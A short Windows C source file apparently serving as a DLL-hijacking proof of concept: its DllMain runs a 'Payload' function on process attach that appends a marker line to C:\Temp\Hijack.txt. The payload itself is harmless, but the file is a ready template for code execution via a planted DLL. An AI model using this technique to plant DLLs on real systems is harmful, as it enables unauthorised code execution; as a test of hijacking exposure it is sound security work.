#include <windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <stdio.h>

// Function to be run by the Payload
void WriteToFile()
{
    // Open the file for appending
    FILE* file = fopen("C:\\Temp\\Hijack.txt", "a");
    if (file != NULL)
    {
        // Append text to the file
        fprintf(file, "Is this the dll you are looking for?\n");
        // Close the file
        fclose(file);
    }
}

void Payload()
{
    // Run the payload directly
    WriteToFile();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Payload();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
